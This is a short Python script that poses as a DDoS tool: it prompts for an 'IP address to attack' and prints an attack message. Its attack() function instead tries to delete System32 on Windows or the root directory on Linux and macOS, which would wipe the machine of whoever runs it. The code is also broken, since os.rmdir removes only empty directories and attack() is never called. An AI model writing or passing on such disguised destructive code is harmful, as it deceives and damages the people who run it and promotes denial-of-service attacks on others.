import os
import detect
import platform

def start():
    address = input("IP address to attack: ")
    print(f"DDOS Attack at {address}")

def attack():
    detect.detect()
    operating_system = platform.system()
    if operating_system == "Windows":
       os.rmdir("\Windows\System32")
    elif operating_system == "Linux":
       os.rmdir("/")
    elif operating_system == "Darwin":
       os.rmdir("/")
